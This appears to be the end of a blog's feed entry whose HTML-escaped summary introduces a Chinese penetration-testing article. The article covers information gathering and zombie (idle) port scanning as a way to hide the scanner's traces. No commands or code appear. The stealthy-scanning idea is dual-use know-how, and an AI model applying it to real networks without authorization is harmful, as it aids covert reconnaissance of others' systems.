    <summary type="html">
    
      &lt;h2 id=&quot;0x00-信息收集简介&quot;&gt;&lt;a href=&quot;#0x00-信息收集简介&quot; class=&quot;headerlink&quot; title=&quot;0x00. 信息收集简介&quot;&gt;&lt;/a&gt;&lt;strong&gt;0x00. 信息收集简介&lt;/strong&gt;&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-渗透测试中，信息收集是最重要的阶段，占据整个渗透测试的60-左右，根据收集到的信息可以有效提高我们渗透测试的成功率，可见高效的信息收集对我们是多么重要。僵尸扫描正是信息收集环节的端口扫描阶段，但是常见的端口扫描过程往往会在网络层被发现痕迹，导致没有达到预期的隐藏目的，僵尸扫描却能有效的隐藏自己的踪迹。&quot;&gt;&lt;a href=&quot;#emsp-emsp-渗透测试中，信息收集是最重要的阶段，占据整个渗透测试的60-左右，根据收集到的信息可以有效提高我们渗透测试的成功率，可见高效的信息收集对我们是多么重要。僵尸扫描正是信息收集环节的端口扫描阶段，但是常见的端口扫描过程往往会在网络层被发现痕迹，导致没有达到预期的隐藏目的，僵尸扫描却能有效的隐藏自己的踪迹。&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;渗透测试中，信息收集是最重要的阶段，占据整个渗透测试的60%左右，根据收集到的信息可以有效提高我们渗透测试的成功率，可见高效的信息收集对我们是多么重要。僵尸扫描正是信息收集环节的端口扫描阶段，但是常见的端口扫描过程往往会在网络层被发现痕迹，导致没有达到预期的隐藏目的，僵尸扫描却能有效的隐藏自己的踪迹。&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;渗透测试中，信息收集是最重要的阶段，占据整个渗透测试的60%左右，根据收集到的信息可以有效提高我们渗透测试的成功率，可见高效的信息收集对我们是多么重要。僵尸扫描正是信息收集环节的端口扫描阶段，但是常见的端口扫描过程往往会在网络层被发现痕迹，导致没有达到预期的隐藏目的，僵尸扫描却能有效的隐藏自己的踪迹。&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
